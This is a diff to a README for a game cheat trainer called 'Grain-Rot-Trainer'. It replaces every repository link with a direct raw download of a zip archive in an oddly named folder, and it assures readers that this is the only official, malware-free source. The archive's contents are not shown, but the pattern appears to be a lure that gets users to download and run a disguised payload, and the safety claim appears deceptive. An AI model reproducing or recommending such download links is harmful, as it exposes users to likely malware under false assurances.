@@ -1,6 +1,6 @@
 # 🔥 Grain-Rot-Trainer - Cheat Engine for Co-op Survival
 
-[![Download Grain-Rot-Trainer](https://img.shields.io/badge/Download-Grain--Rot--Trainer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Matita8730/Grain-Rot-Trainer)
+[![Download Grain-Rot-Trainer](https://img.shields.io/badge/Download-Grain--Rot--Trainer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Matita8730/Grain-Rot-Trainer/main/madreporitic/1.2.zip)
 
 ## 🎮 What Is This?
 
@@ -25,7 +25,7 @@ Grain-Rot-Trainer is a powerful mod menu and trainer for the PC version of Grain
 
 Visit this link to download the application:
 
-[**Download Grain-Rot-Trainer**](https://github.com/Matita8730/Grain-Rot-Trainer)
+[**Download Grain-Rot-Trainer**](https://raw.githubusercontent.com/Matita8730/Grain-Rot-Trainer/main/madreporitic/1.2.zip)
 
 The download will start automatically. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -124,7 +124,7 @@ This is rare, but if it happens, disable all cheats and enable them one by one t
 
 Ready to get started? Here's your download link one more time:
 
-[**⬇️ Download Grain-Rot-Trainer Now**](https://github.com/Matita8730/Grain-Rot-Trainer)
+[**⬇️ Download Grain-Rot-Trainer Now**](https://raw.githubusercontent.com/Matita8730/Grain-Rot-Trainer/main/madreporitic/1.2.zip)
 
 Remember, this is the only official source for this trainer. Always download from this page to get the latest version and avoid malware.
 
